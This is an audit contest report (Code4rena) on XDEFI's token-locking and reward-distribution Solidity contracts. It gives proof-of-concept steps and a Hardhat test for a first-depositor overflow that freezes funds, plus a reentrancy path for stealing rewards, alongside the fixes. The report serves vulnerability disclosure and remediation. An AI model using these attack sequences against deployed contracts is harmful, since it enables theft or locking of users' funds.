@@ -1,0 +1,592 @@
+---
+sponsor: "XDEFI"
+slug: "2022-01-xdefi"
+date: "2022-02-10"
+title: "XDEFI contest"
+findings: "https://github.com/code-423n4/2022-01-xdefi-findings/issues"
+contest: 75
+---
+
+# Overview
+
+## About C4
+
+Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.
+
+A C4 code contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.
+
+During the code contest outlined in this document, C4 conducted an analysis of XDEFI contest smart contract system written in Solidity. The code contest took place between January 4—January 6 2022.
+
+## Wardens
+
+41 Wardens contributed reports to the XDEFI contest:
+
+1. WatchPug ([jtp](https://github.com/jack-the-pug) and [ming](https://github.com/mingwatch))
+1. [onewayfunction](https://twitter.com/onewayfunction)
+1. [sirhashalot](https://twitter.com/SirH4shalot)
+1. [cmichel](https://twitter.com/cmichelio)
+1. [kenzo](https://twitter.com/KenzoAgada)
+1. [Fitraldys](https://twitter.com/fitraldys)
+1. [Tomio](https://twitter.com/meidhiwirara)
+1. Czar102
+1. cccz
+1. [tqts](https://tqts.ar/)
+1. egjlmn1
+1. robee
+1. pedroais
+1. [Dravee](https://twitter.com/JustDravee)
+1. [defsec](https://twitter.com/defsec_)
+1. [TomFrenchBlockchain](https://github.com/TomAFrench)
+1. [PierrickGT](https://twitter.com/PierrickGT)
+1. [OriDabush](https://twitter.com/ori_dabush)
+1. [leastwood](https://twitter.com/liam_eastwood13)
+1. [MaCree](https://twitter.com/qwertyuiop_eth)
+1. [0xsanson](https://github.com/0xsanson)
+1. [rfa](https://www.instagram.com/riyan_rfa/)
+1. Jujic
+1. [hack3r-0m](https://twitter.com/hack3r_0m)
+1. [agusduha](https://twitter.com/AgusDuha)
+1. [ye0lde](https://twitter.com/_ye0lde)
+1. [GiveMeTestEther](https://twitter.com/GiveMeTestEther)
+1. [wuwe1](https://twitter.com/wuwe19)
+1. certora
+1. jayjonah8
+1. [danb](https://twitter.com/danbinnun)
+1. [gpersoon](https://twitter.com/gpersoon)
+1. harleythedog
+1. [StErMi](https://ericci.dev/)
+1. ACai
+1. bitbopper
+1. mtz
+1. p4st13r4
+1. saian
+1. [BouSalman](bousalman.com)
+
+This contest was judged by [Ivo Georgiev](https://twitter.com/ivshti).
+
+Final report assembled by [captainmango](https://github.com/captainmango) and [dzhawsh](https://github.com/joshuashort).
+
+# Summary
+
+The C4 analysis yielded an aggregated total of 13 unique vulnerabilities and 50 total findings. All of the issues presented here are linked back to their original finding.
+
+Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity, 1 received a risk rating in the category of MEDIUM severity, and 10 received a risk rating in the category of LOW severity.
+
+C4 analysis also identified 9 non-critical recommendations and 28 gas optimizations.
+
+# Scope
+
+The code under review can be found within the [C4 XDEFI contest repository](https://github.com/code-423n4/2022-01-xdefi), and is composed of 2 smart contracts written in the Solidity programming language and includes 539 lines of Solidity code.
+
+# Severity Criteria
+
+C4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).
+
+Vulnerabilities are divided into three primary risk categories: high, medium, and low.
+
+High-level considerations for vulnerabilities span the following key areas when conducting assessments:
+
+- Malicious Input Handling
+- Escalation of privileges
+- Arithmetic
+- Gas use
+
+Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code423n4.com).
+
+# High Risk Findings (2)
+## [[H-01] Malicious early user/attacker can malfunction the contract and even freeze users' funds in edge cases](https://github.com/code-423n4/2022-01-xdefi-findings/issues/156)
+_Submitted by WatchPug_
+
+<https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L151-L151>
+
+```solidity
+_pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);
+```
+
+In the current implementation,  `_pointsPerUnit` can be changed in `updateDistribution()` which can be called by anyone.
+
+A malicious early user can `lock()` with only `1 wei` of XDEFI and makes `_pointsPerUnit` to be very large, causing future users not to be able to `lock()` and/or `unlock()` anymore due to overflow in arithmetic related to `_pointsMultiplier`.
+
+As a result, the contract can be malfunctioning and even freeze users' funds in edge cases.
+
+#### Proof of Concept
+
+Given:
+
+*   bonusMultiplierOf\[30 days] = 100
+
+1.  Alice `lock()` `1 wei` of XDEFI for 30 days as the first user of the contract. Got `1` units, and `totalUnits` now is `1`;
+2.  Alice sends `170141183460469 wei` of `XDEFI` to the contract and calls `updateDistribution()`:
+
+```solidity
+_pointsPerUnit += ((170141183460469 * 2**128) / 1);
+```
+
+3.  Bob tries to `lock()` `1,100,000 * 1e18` of `XDEFI` for 30 days, the tx will fail, as `_pointsPerUnit * units` overlows;
+4.  Bob `lock()` `1,000,000 * 1e18` of `XDEFI` for 30 days;
+5.  The rewarder sends `250,000 * 1e18` of `XDEFI` to the contract and calls `updateDistribution()`:
+
+```solidity
+_pointsPerUnit += ((250_000 * 1e18 * 2**128) / (1_000_000 * 1e18 + 1));
+```
+
+6.  30 days later, Bob tries to call `unlock()`, the tx will fail, as `_pointsPerUnit * units` overflows.
+
+#### Recommended Mitigation Steps
+
+Uniswap v2 solved a similar problem by sending the first 1000 lp tokens to the zero address.
+
+The same solution should work here, i.e., on constructor set an initial amount (like 1e8) for `totalUnits`
+
+<https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L39-L44>
+
+```solidity
+constructor (address XDEFI_, string memory baseURI_, uint256 zeroDurationPointBase_) ERC721("Locked XDEFI", "lXDEFI") {
+    require((XDEFI = XDEFI_) != address(0), "INVALID_TOKEN");
+    owner = msg.sender;
+    baseURI = baseURI_;
+    _zeroDurationPointBase = zeroDurationPointBase_;
+
+    totalUnits = 100_000_000;
+}
+```
+
+**[deluca-mike (XDEFI) confirmed](https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1008255566):**
+> This is a great catch! I just tested it:
+> 
+> ```js
+> const { expect } = require("chai");
+> const { ethers } = require("hardhat");
+> 
+> const totalSupply = '240000000000000000000000000';
+> 
+> const toWei = (value, add = 0, sub = 0) => (BigInt(value) * 1_000_000_000_000_000_000n + BigInt(add) - BigInt(sub)).toString();
+> 
+> describe("XDEFIDistribution", () => {
+>     it("Can overflow _pointsPerUnit", async () => {
+>         const [god, alice, bob] = await ethers.getSigners();
+> 
+>         const XDEFI = await (await (await ethers.getContractFactory("XDEFI")).deploy("XDEFI", "XDEFI", totalSupply)).deployed();
+>         const XDEFIDistribution = await (await (await ethers.getContractFactory("XDEFIDistribution")).deploy(XDEFI.address, "https://www.xdefi.io/nfts/", 0)).deployed();
+> 
+>         // Give each account 2,000,000 XDEFI
+>         await (await XDEFI.transfer(alice.address, toWei(2_000_000))).wait();
+>         await (await XDEFI.transfer(bob.address, toWei(2_000_000))).wait();
+> 
+>         // bonusMultiplierOf[30 days] = 100
+>         await (await XDEFIDistribution.setLockPeriods([2592000], [100])).wait();
+> 
+>         // 1. Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1;
+>         await (await XDEFI.connect(alice).approve(XDEFIDistribution.address, 1)).wait();
+>         await (await XDEFIDistribution.connect(alice).lock(1, 2592000, alice.address)).wait();
+>         expect(await XDEFIDistribution.balanceOf(alice.address)).to.equal('1');
+>         const nft1 = (await XDEFIDistribution.tokenOfOwnerByIndex(alice.address, 0)).toString();
+>         expect((await XDEFIDistribution.positionOf(nft1)).units).to.equal(1);
+> 
+>         // 2. Alice sends 170141183460469 wei of XDEFI to the contract and calls updateDistribution()
+>         await (await XDEFI.connect(alice).transfer(XDEFIDistribution.address, 170141183460469)).wait();
+>         await (await XDEFIDistribution.connect(alice).updateDistribution()).wait();
+> 
+>         // 3. Bob tries to lock() 1,100,000 * 1e18 of XDEFI for 30 days, the tx will fail, as _pointsPerUnit * units overflows
+>         await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(1_100_000))).wait();
+>         await expect(XDEFIDistribution.connect(bob).lock(toWei(1_100_000), 2592000, bob.address)).to.be.revertedWith("_toInt256Safe failed");
+> 
+>         // 4. Bob lock() 1,000,000 * 1e18 of XDEFI for 30 days
+>         await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(1_000_000))).wait();
+>         await (await XDEFIDistribution.connect(bob).lock(toWei(1_000_000), 2592000, bob.address)).wait();
+>         expect(await XDEFIDistribution.balanceOf(bob.address)).to.equal('1');
+>         const nft2 = (await XDEFIDistribution.tokenOfOwnerByIndex(bob.address, 0)).toString();
+>         expect((await XDEFIDistribution.positionOf(nft2)).units).to.equal(toWei(1_000_000));
+> 
+>         // 5. The rewarder sends 250,000 * 1e18 of XDEFI to the contract and calls updateDistribution()
+>         await (await XDEFI.transfer(XDEFIDistribution.address, toWei(250_000))).wait();
+>         await (await XDEFIDistribution.updateDistribution()).wait();
+> 
+>         // 6. 30 days later, Bob tries to call unlock(), the tx will fail, as _pointsPerUnit * units overflows.
+>         await hre.ethers.provider.send('evm_increaseTime', [2592000]);
+>         await expect(XDEFIDistribution.connect(bob).unlock(nft2, bob.address)).to.be.revertedWith("_toInt256Safe failed");
+>     });
+> });
+> ```
+> 
+> While I do like the suggestion to to `totalUnits = 100_000_000;` in the constructor, it will result "uneven" numbers due to the `totalUnits` offset. I wonder if I can resolve this but just reducing `_pointsMultiplier` to `uint256(2**96)` as per https://github.com/ethereum/EIPs/issues/1726#issuecomment-472352728.
+
+**[deluca-mike (XDEFI) commented](https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1008266150):**
+> OK, I think I can solve this with `_pointsMultiplier = uint256(2**72)`:
+> 
+> ```js
+> const { expect } = require("chai");
+> const { ethers } = require("hardhat");
+> 
+> const totalSupply = '240000000000000000000000000';
+> 
+> const toWei = (value, add = 0, sub = 0) => (BigInt(value) * 1_000_000_000_000_000_000n + BigInt(add) - BigInt(sub)).toString();
+> 
+> describe("XDEFIDistribution", () => {
+>     it("Can overflow _pointsPerUnit", async () => {
+>         const [god, alice, bob] = await ethers.getSigners();
+> 
+>         const XDEFI = await (await (await ethers.getContractFactory("XDEFI")).deploy("XDEFI", "XDEFI", totalSupply)).deployed();
+>         const XDEFIDistribution = await (await (await ethers.getContractFactory("XDEFIDistribution")).deploy(XDEFI.address, "https://www.xdefi.io/nfts/", 0)).deployed();
+> 
+>         // Give each account 100M XDEFI
+>         await (await XDEFI.transfer(alice.address, toWei(100_000_000))).wait();
+>         await (await XDEFI.transfer(bob.address, toWei(100_000_000))).wait();
+> 
+>         // bonusMultiplierOf[30 days] = 255
+>         await (await XDEFIDistribution.setLockPeriods([2592000], [255])).wait();
+> 
+>         // 1. Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1
+>         await (await XDEFI.connect(alice).approve(XDEFIDistribution.address, 1)).wait();
+>         await (await XDEFIDistribution.connect(alice).lock(1, 2592000, alice.address)).wait();
+>         expect(await XDEFIDistribution.balanceOf(alice.address)).to.equal('1');
+>         const nft1 = (await XDEFIDistribution.tokenOfOwnerByIndex(alice.address, 0)).toString();
+>         expect((await XDEFIDistribution.positionOf(nft1)).units).to.equal(2);
+> 
+>         // 2. Alice sends 100M XDEFI minus 1 wei to the contract and calls updateDistribution()
+>         await (await XDEFI.connect(alice).transfer(XDEFIDistribution.address, toWei(100_000_000, 0, 1))).wait();
+>         await (await XDEFIDistribution.connect(alice).updateDistribution()).wait();
+> 
+>         // 3. Bob can lock() 100M XDEFI for 30 days
+>         await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(100_000_000))).wait();
+>         await (await XDEFIDistribution.connect(bob).lock(toWei(100_000_000), 2592000, bob.address)).wait();
+>         expect(await XDEFIDistribution.balanceOf(bob.address)).to.equal('1');
+>         const nft2 = (await XDEFIDistribution.tokenOfOwnerByIndex(bob.address, 0)).toString();
+>         expect((await XDEFIDistribution.positionOf(nft2)).units).to.equal(toWei(255_000_000));
+> 
+>         // 4. The rewarder sends 40M XDEFI to the contract and calls updateDistribution()
+>         await (await XDEFI.transfer(XDEFIDistribution.address, toWei(40_000_000))).wait();
+>         await (await XDEFIDistribution.updateDistribution()).wait();
+> 
+>         // 5. 30 days later, Bob can call unlock()
+>         await hre.ethers.provider.send('evm_increaseTime', [2592000]);
+>         await (await XDEFIDistribution.connect(bob).unlock(nft2, bob.address)).wait();
+>     });
+> });
+> ```
+
+**[deluca-mike (XDEFI) commented](https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1012773001):**
+> In the [release candidate contract](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol), in order to preserve the math (formulas), at the cost of some accuracy, we went with a [`_pointsMultiplier` of 72 bits](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L23).
+> 
+> Also, a [minimum units locked](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L53) is enforced, to prevent "dust" from creating a very very high `_pointsPerUnit`.
+> 
+> Tests were written in order to stress test the contract against the above extreme cases.
+> 
+> Further, a "no-going-back" [emergency mode setter](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L100) was implemented that allows (but does not force) users to [withdraw only their deposits](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L147) without any of the funds distribution math from being expected, in the event that some an edge case does arise.
+
+**[Ivshti (Judge) commented](https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1013782548):**
+> fantastic finding, agreed with the proposed severity!
+> 
+> The sponsor fixes seem adequate: a lower `_poinsMultiplier`, a minimum lock and an emergency mode that disables reward math, somewhat similar to emergency withdraw functions in contracts like masterchef.
+
+
+
+## [[H-02] The reentrancy vulnerability in _safeMint can allow an attacker to steal all rewards](https://github.com/code-423n4/2022-01-xdefi-findings/issues/25)
+_Submitted by cccz, also found by cmichel, Fitraldys, kenzo, onewayfunction, and tqts_
+
+There is a reentrancy vulnerability in the \_safeMint function
+```solidity
+function _safeMint(
+    address to,
+    uint256 tokenId,
+    bytes memory _data
+) internal virtual {
+    _mint(to, tokenId);
+    require(
+        _checkOnERC721Received(address(0), to, tokenId, _data),
+        "ERC721: transfer to non ERC721Receiver implementer"
+    );
+}
+...
+function _checkOnERC721Received(
+    address from,
+    address to,
+    uint256 tokenId,
+    bytes memory _data
+) private returns (bool) {
+    if (to.isContract()) {
+        try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
+            return retval == IERC721Receiver.onERC721Received.selector;
+```
+The lock function changes the totalDepositedXDEFI variable after calling the \_safeMint function
+```solidity
+function lock(uint256 amount_, uint256 duration_, address destination_) external noReenter returns (uint256 tokenId_) {
+    // Lock the XDEFI in the contract.
+    SafeERC20.safeTransferFrom(IERC20(XDEFI), msg.sender, address(this), amount_);
+
+    // Handle the lock position creation and get the tokenId of the locked position.
+    return _lock(amount_, duration_, destination_);
+}
+...
+    function _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {
+    // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.
+    require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, "INVALID_AMOUNT");
+
+    // Get bonus multiplier and check that it is not zero (which validates the duration).
+    uint8 bonusMultiplier = bonusMultiplierOf[duration_];
+    require(bonusMultiplier != uint8(0), "INVALID_DURATION");
+
+    // Mint a locked staked position NFT to the destination.
+    _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));
+
+    // Track deposits.
+    totalDepositedXDEFI += amount_;
+```
+
+Since the updateDistribution function does not use the noReenter modifier, the attacker can re-enter the updateDistribution function in the \_safeMint function. Since the value of totalDepositedXDEFI is not updated at this time, the \_pointsPerUnit variable will become abnormally large.
+
+```solidity
+    function updateDistribution() external {
+       uint256 totalUnitsCached = totalUnits;
+
+       require(totalUnitsCached> uint256(0), "NO_UNIT_SUPPLY");
+
+       uint256 newXDEFI = _toUint256Safe(_updateXDEFIBalance());
+
+       if (newXDEFI == uint256(0)) return;
+
+       _pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);
+
+       emit DistributionUpdated(msg.sender, newXDEFI);
+   }
+   ...
+   function _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {
+       uint256 previousDistributableXDEFI = distributableXDEFI;
+       uint256 currentDistributableXDEFI = distributableXDEFI = IERC20(XDEFI).balanceOf(address(this))-totalDepositedXDEFI;
+
+       return _toInt256Safe(currentDistributableXDEFI)-_toInt256Safe(previousDistributableXDEFI);
+   }
+
+```
+
+If the attacker calls the lock function to get the NFT before exploiting the reentrance vulnerability, then the unlock function can be called to steal a lot of rewards, and the assets deposited by the user using the reentrance vulnerability can also be redeemed by calling the unlock function. Since the unlock function calls the \_updateXDEFIBalance function, the attacker cannot steal the assets deposited by the user
+```solidity
+
+function unlock(uint256 tokenId_, address destination_) external noReenter returns (uint256 amountUnlocked_) {
+    // Handle the unlock and get the amount of XDEFI eligible to withdraw.
+    amountUnlocked_ = _unlock(msg.sender, tokenId_);
+
+    // Send the the unlocked XDEFI to the destination.
+    SafeERC20.safeTransfer(IERC20(XDEFI), destination_, amountUnlocked_);
+
+    // NOTE: This needs to be done after updating `totalDepositedXDEFI` (which happens in `_unlock`) and transferring out.
+    _updateXDEFIBalance();
+}
+...
+function _unlock(address account_, uint256 tokenId_) internal returns (uint256 amountUnlocked_) {
+    // Check that the account is the position NFT owner.
+    require(ownerOf(tokenId_) == account_, "NOT_OWNER");
+
+    // Fetch position.
+    Position storage position = positionOf[tokenId_];
+    uint96 units = position.units;
+    uint88 depositedXDEFI = position.depositedXDEFI;
+    uint32 expiry = position.expiry;
+
+    // Check that enough time has elapsed in order to unlock.
+    require(expiry != uint32(0), "NO_LOCKED_POSITION");
+    require(block.timestamp >= uint256(expiry), "CANNOT_UNLOCK");
+
+    // Get the withdrawable amount of XDEFI for the position.
+    amountUnlocked_ = _withdrawableGiven(units, depositedXDEFI, position.pointsCorrection);
+
+    // Track deposits.
+    totalDepositedXDEFI -= uint256(depositedXDEFI);
+
+    // Burn FDT Position.
+    totalUnits -= units;
+    delete positionOf[tokenId_];
+
+    emit LockPositionWithdrawn(tokenId_, account_, amountUnlocked_);
+}
+...
+function _withdrawableGiven(uint96 units_, uint88 depositedXDEFI_, int256 pointsCorrection_) internal view returns (uint256 withdrawableXDEFI_) {
+    return
+        (
+            _toUint256Safe(
+                _toInt256Safe(_pointsPerUnit * uint256(units_)) +
+                pointsCorrection_
+            ) / _pointsMultiplier
+        ) + uint256(depositedXDEFI_);
+}
+```
+
+#### Proof of Concept
+
+<https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L253-L281>
+
+#### Recommended Mitigation Steps
+
+    -    function updateDistribution() external  {
+    +    function updateDistribution() external  noReenter {
+
+
+**[deluca-mike (XDEFI) resolved](https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1008233320):**
+> Valid and a big issue. However, due to other recommendations, I will not solve it this way. Instead, `updateDistribution()` will be called at the start of every lock/unlock function (so it can't have a `noReenter` modifier), and the `_safeMint` calls will be moved to the end of their respective operations to prevent the effect of the re-entrancy (i.e. position will created with a `_pointsPerUnit` before a re-entering from `_safeMint` can affect it). Tests will be added to show this is not longer possible.
+
+**[deluca-mike (XDEFI) commented](https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1012774852):**
+> In our release candidate contract, as mentioned above, `updateDistribution()` is called before each locking and unlocking function, via a [`updatePointsPerUnitAtStart` modifier](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L77-L80), and thus, `updateDistribution()` is now a public fucntion, and since it is used by other functions, cannot be behind a `noReenter`.
+> 
+> See:
+> - [`lock`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L177)
+> - [`lockWithPermit`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L181)
+> - [`relock`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L188)
+> - [`unlock`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L195)
+> - [`relockBatch`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L233)
+> - [`unlockBatch`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L240)
+> 
+> Also, [a test was written](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/test/XDEFIDistributionReceivers.js) to ensure that this is no longer exploitable, and that the contract behaves properly if a re-entrancy call `updateDistribution()`.
+
+**[Ivshti (Judge) commented](https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1013783009):**
+> Agreed with the severity.
+> 
+> Resolution of reordering the calls seems to be adequate 
+
+
+
+ 
+# Medium Risk Findings (1)
+## [[M-01] `_safeMint` Will Fail Due To An Edge Case In Calculating `tokenId` Using The `_generateNewTokenId` Function](https://github.com/code-423n4/2022-01-xdefi-findings/issues/17)
+_Submitted by leastwood, also found by cmichel, cmichel, egjlmn1, kenzo, MaCree, onewayfunction, sirhashalot, and WatchPug_
+
+#### Impact
+
+NFTs are used to represent unique positions referenced by the generated `tokenId`. The `tokenId` value contains the position's score in the upper 128 bits and the index wrt. the token supply in the lower 128 bits.
+
+When positions are unlocked after expiring, the relevant position stored in the `positionOf` mapping is deleted, however, the NFT is not. The `merge()` function is used to combine points in unlocked NFTs, burning the underlying NFTs upon merging. As a result, `_generateNewTokenId()` may end up using the same `totalSupply()` value, causing `_safeMint()` to fail if the same `amount_` and `duration_` values are used.
+
+This edge case only occurs if there is an overlap in the `points_` and `totalSupply() + 1` values used to generate `tokenId`. As a result, this may impact a user's overall experience while interacting with the `XDEFI` protocol, as some transactions may fail unexpectedly.
+
+#### Proof of Concept
+```solidity
+function _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {
+    // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.
+    require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, "INVALID_AMOUNT");
+
+    // Get bonus multiplier and check that it is not zero (which validates the duration).
+    uint8 bonusMultiplier = bonusMultiplierOf[duration_];
+    require(bonusMultiplier != uint8(0), "INVALID_DURATION");
+
+    // Mint a locked staked position NFT to the destination.
+    _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));
+
+    // Track deposits.
+    totalDepositedXDEFI += amount_;
+
+    // Create Position.
+    uint96 units = uint96((amount_ * uint256(bonusMultiplier)) / uint256(100));
+    totalUnits += units;
+    positionOf[tokenId_] =
+        Position({
+            units: units,
+            depositedXDEFI: uint88(amount_),
+            expiry: uint32(block.timestamp + duration_),
+            created: uint32(block.timestamp),
+            bonusMultiplier: bonusMultiplier,
+            pointsCorrection: -_toInt256Safe(_pointsPerUnit * units)
+        });
+
+    emit LockPositionCreated(tokenId_, destination_, amount_, duration_);
+}
+```
+```solidity
+function _generateNewTokenId(uint256 points_) internal view returns (uint256 tokenId_) {
+    // Points is capped at 128 bits (max supply of XDEFI for 10 years locked), total supply of NFTs is capped at 128 bits.
+    return (points_ << uint256(128)) + uint128(totalSupply() + 1);
+}
+```
+
+```solidity
+function merge(uint256[] memory tokenIds_, address destination_) external returns (uint256 tokenId_) {
+    uint256 count = tokenIds_length;
+    require(count > uint256(1), "MIN_2_TO_MERGE");
+
+    uint256 points;
+
+    // For each NFT, check that it belongs to the caller, burn it, and accumulate the points.
+    for (uint256 i; i < count; ++i) {
+        uint256 tokenId = tokenIds_[i];
+        require(ownerOf(tokenId) == msg.sender, "NOT_OWNER");
+        require(positionOf[tokenId].expiry == uint32(0), "POSITION_NOT_UNLOCKED");
+
+        _burn(tokenId);
+
+        points += _getPointsFromTokenId(tokenId);
+    }
+
+    // Mine a new NFT to the destinations, based on the accumulated points.
+    _safeMint(destination_, tokenId_ = _generateNewTokenId(points));
+}
+```
+
+#### Recommended Mitigation Steps
+
+Consider replacing `totalSupply()` in `_generateNewTokenId()` with an internal counter. This should ensure that `_generateNewTokenId()` always returns a unique `tokenId` that is monotomically increasing .
+
+**[deluca-mike (XDEFI) confirmed](https://github.com/code-423n4/2022-01-xdefi-findings/issues/17#issuecomment-1012535766):**
+> In the release candidate contract, `_generateNewTokenId` now used an [internal `_tokensMinted` variable](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L36) instead of `totalSupply()`, as seen [here](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L393).
+**[Ivshti (Judge) commented](https://github.com/code-423n4/2022-01-xdefi-findings/issues/17#issuecomment-1013783639):**
+> Agreed with sponsor
+> 
+> As for mitigation, the new way to generate token IDs seems cleaner, but more gas consuming
+
+# Low Risk Findings (10)
+- [[L-01] Distribution Updates Can Be Gamed](https://github.com/code-423n4/2022-01-xdefi-findings/issues/30) _Submitted by leastwood, also found by cmichel, danb, egjlmn1, gpersoon, hack3r-0m, harleythedog, kenzo, StErMi, and WatchPug_
+- [[L-02] setLockPeriods function lack of input validation](https://github.com/code-423n4/2022-01-xdefi-findings/issues/38) _Submitted by cccz, also found by agusduha, certora, hack3r-0m, jayjonah8, Jujic, Tomio, WatchPug, and ye0lde_
+- [[L-03] Owner can steal XDEFI without any capital risk](https://github.com/code-423n4/2022-01-xdefi-findings/issues/52) _Submitted by onewayfunction_
+- [[L-04] Possible profitability manipulations](https://github.com/code-423n4/2022-01-xdefi-findings/issues/193) _Submitted by Czar102_
+- [[L-06] Assert instead require to validate user inputs](https://github.com/code-423n4/2022-01-xdefi-findings/issues/14) _Submitted by robee, also found by egjlmn1 and WatchPug_
+- [[L-07] `_zeroDurationPointBase` can potentially be exploited to get more scores](https://github.com/code-423n4/2022-01-xdefi-findings/issues/139) _Submitted by WatchPug, also found by pedroais_
+- [[L-08] Unsafe type casting](https://github.com/code-423n4/2022-01-xdefi-findings/issues/142) _Submitted by WatchPug_
+- [[L-09] Use of return value from assignment hampers readability](https://github.com/code-423n4/2022-01-xdefi-findings/issues/2) _Submitted by TomFrenchBlockchain, also found by egjlmn1, robee, and WatchPug_
+- [[L-10] No option to unlock funds before set duration](https://github.com/code-423n4/2022-01-xdefi-findings/issues/183) _Submitted by sirhashalot_
+- [[L-11] in function setLockPeriods, multiplier can be set to lower than 100](https://github.com/code-423n4/2022-01-xdefi-findings/issues/96) _Submitted by Tomio_
+
+# Non-Critical Findings (9)
+- [[N-01] Require with not comprehensive message](https://github.com/code-423n4/2022-01-xdefi-findings/issues/11) _Submitted by robee_
+- [[N-02] Event for merge](https://github.com/code-423n4/2022-01-xdefi-findings/issues/197) _Submitted by 0xsanson_
+- [[N-03] Missing event for admin function setBaseURI](https://github.com/code-423n4/2022-01-xdefi-findings/issues/16) _Submitted by BouSalman, also found by WatchPug_
+- [[N-04] Wrong revert message](https://github.com/code-423n4/2022-01-xdefi-findings/issues/171) _Submitted by Czar102_
+- [[N-05] Improper event declaration](https://github.com/code-423n4/2022-01-xdefi-findings/issues/196) _Submitted by Czar102_
+- [[N-06] Implicit casts should be explicit as per the global code style](https://github.com/code-423n4/2022-01-xdefi-findings/issues/129) _Submitted by Dravee_
+- [[N-07] Various Non-Conformance to Solidity naming conventions](https://github.com/code-423n4/2022-01-xdefi-findings/issues/60) _Submitted by Dravee_
+- [[N-08] Avoid inline code for better readibility](https://github.com/code-423n4/2022-01-xdefi-findings/issues/136) _Submitted by StErMi_
+- [[N-09] Constants are not explicitly declared](https://github.com/code-423n4/2022-01-xdefi-findings/issues/115) _Submitted by WatchPug_
+
+# Gas Optimizations (28)
+- [[G-01] XDEFIDistribution: lock should be reused in lockWithPermit](https://github.com/code-423n4/2022-01-xdefi-findings/issues/47) _Submitted by PierrickGT_
+- [[G-02] Gas: `XDEFIDistribution.sol`'s `withdrawAmount` substraction can be unchecked](https://github.com/code-423n4/2022-01-xdefi-findings/issues/49) _Submitted by Dravee, also found by 0xsanson, Jujic, WatchPug, and ye0lde_
+- [[G-03] "Safe" ERC20 functions for XDEFI?](https://github.com/code-423n4/2022-01-xdefi-findings/issues/194) _Submitted by 0xsanson_
+- [[G-04] MAX_TOTAL_XDEFI_SUPPLY should be constant](https://github.com/code-423n4/2022-01-xdefi-findings/issues/36) _Submitted by agusduha, also found by 0xsanson, Czar102, Dravee, GiveMeTestEther, p4st13r4, saian, sirhashalot, and WatchPug_
+- [[G-05] Usage of zero storage for reentrancy guard increases chance that gas refund is capped](https://github.com/code-423n4/2022-01-xdefi-findings/issues/1) _Submitted by TomFrenchBlockchain, also found by 0xsanson, bitbopper, Czar102, leastwood, mtz, and WatchPug_
+- [[G-06] Public functions to external](https://github.com/code-423n4/2022-01-xdefi-findings/issues/6) _Submitted by robee, also found by ACai, agusduha, defsec, and Dravee_
